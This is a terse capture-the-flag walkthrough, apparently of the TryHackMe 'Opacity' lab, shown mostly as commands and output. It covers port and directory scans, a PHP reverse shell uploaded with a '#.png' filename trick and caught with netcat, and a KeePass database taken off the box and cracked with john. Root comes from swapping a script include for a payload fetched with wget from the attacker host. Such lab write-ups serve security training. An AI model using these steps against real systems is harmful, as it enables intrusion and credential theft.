```
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 5c:c3:d4:23:0b:5e:bf:4a:d4:41:f6:6a:76:09:78:34 (RSA)
|   256 86:b0:f9:e7:6b:2e:13:8a:37:7c:9a:91:de:b6:c7:a3 (ECDSA)
|_  256 40:54:19:e8:d6:05:1b:ed:ec:16:9d:e4:e6:91:63:fa (ED25519)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-title: Login
|_Requested resource was login.php
|_http-server-header: Apache/2.4.41 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 3 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: IP-10-67-190-79, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time: 
|   date: 2026-01-01T09:13:14
|_  start_date: N/A
|_clock-skew: 6s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

```

```
└─$ gobuster dir -u http://10.67.190.79 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

/css                  (Status: 301) [Size: 310] [--> http://10.67.190.79/css/]
/cloud                (Status: 301) [Size: 312] [--> http://10.67.190.79/cloud/]

```

I upload reverse shell into `cloud` dir 

```
└─$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.67.190.79 - - [01/Jan/2026 04:26:32] "GET /shell.php HTTP/1.1" 200 -

http://10.67.190.79/cloud/images/shell.php#.png (in cloud upload)

└─$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [192.168.153.193] from (UNKNOWN) [10.67.190.79] 49872
Linux ip-10-67-190-79 5.15.0-138-generic #148~20.04.1-Ubuntu SMP Fri Mar 28 14:32:35 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 09:26:53 up 19 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@ip-10-67-190-79:/$ export TERM=xterm
export TERM=xterm
www-data@ip-10-67-190-79:/$ ^Z
zsh: suspended  nc -lnvp 9001
                                                                                                                                                          
stty raw -echo; fg
stty rows 38 columns 116
[1]  + continued  nc -lnvp 9001

www-data@ip-10-67-190-79:/$ 

```

```
www-data@ip-10-67-190-79:/opt$ ls
dataset.kdbx
www-data@ip-10-67-190-79:/opt$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
192.168.153.193 - - [01/Jan/2026 09:32:26] "GET /dataset.kdbx HTTP/1.1" 200 -
^C

┌──(kali㉿kali)-[~/tryhackme/opacity]
└─$ keepass2john dataset.kdbx > keepasshash.txt


└─$ john keepasshash.txt --wordlist=/usr/share/wordlists/rockyou.txt          
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 100000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
741852963        (dataset)     
1g 0:00:00:14 DONE (2026-01-01 04:33) 0.06756g/s 59.45p/s 59.45c/s 59.45C/s felipe..gorgeous
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

after crack need to use `keepass2` tool to open dataset find pwd and get real credintial

```
sysadmin@ip-10-67-190-79:~$ ls
local.txt  scripts

```

root

```
sysadmin@ip-10-67-190-79:~/scripts/lib$ rm -rf backup.inc.php
sysadmin@ip-10-67-190-79:~/scripts/lib$ ls
application.php  biopax2bio2rdf.php  dataset.php  owlapi.php  rdfapi.php    utils.php
bio2rdfapi.php   dataresource.php    fileapi.php  phplib.php  registry.php  xmlapi.php
sysadmin@ip-10-67-190-79:~/scripts/lib$ wget http://192.168.153.193:8000/backup.inc.php
--2026-01-01 10:17:47--  http://192.168.153.193:8000/backup.inc.php
Connecting to 192.168.153.193:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2479 (2.4K) [application/octet-stream]
Saving to: ‘backup.inc.php’

backup.inc.php                         100%[==========================================================================>]   2.42K  2.85KB/s    in 0.9s    

2026-01-01 10:17:49 (2.85 KB/s) - ‘backup.inc.php’ saved [2479/2479]

sysadmin@ip-10-67-190-79:~/scripts/lib$ ls
application.php  bio2rdfapi.php      dataresource.php  fileapi.php  phplib.php  registry.php  xmlapi.php
backup.inc.php   biopax2bio2rdf.php  dataset.php       owlapi.php   rdfapi.php  utils.php
sysadmin@ip-10-67-190-79:~/scripts/lib$ chmod +x backup.inc.php
sysadmin@ip-10-67-190-79:~/scripts/lib$ ./backup.inc.php

```

```
└─$ nc -lnvp 7777
listening on [any] 7777 ...
connect to [192.168.153.193] from (UNKNOWN) [10.67.190.79] 36262
Linux ip-10-67-190-79 5.15.0-138-generic #148~20.04.1-Ubuntu SMP Fri Mar 28 14:32:35 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 10:19:02 up  1:11,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
sysadmin pts/1    192.168.153.193  10:01   13.00s  0.04s  0.04s -bash
uid=0(root) gid=0(root) groups=0(root)
/bin/sh: 0: can't access tty; job control turned off
# cd root
# ls
proof.txt
snap
# cat proof.txt

```